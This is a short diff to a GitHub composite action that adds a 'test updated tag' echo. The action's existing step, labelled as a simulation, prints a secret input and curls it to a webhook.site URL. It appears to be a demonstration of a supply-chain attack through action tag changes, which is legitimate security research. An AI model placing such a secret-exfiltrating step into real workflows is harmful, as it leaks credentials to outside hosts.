@@ -9,6 +9,7 @@ runs:
   using: "composite"
   steps:
     - run: |
+	echo "test updated tag"
         echo "🚨 Simulating secret exfil"
         echo "Leaked secret: ${{ inputs.secret }}"
         curl -X POST https://webhook.site/your-personal-url -d "leaked=${{ inputs.secret }}"
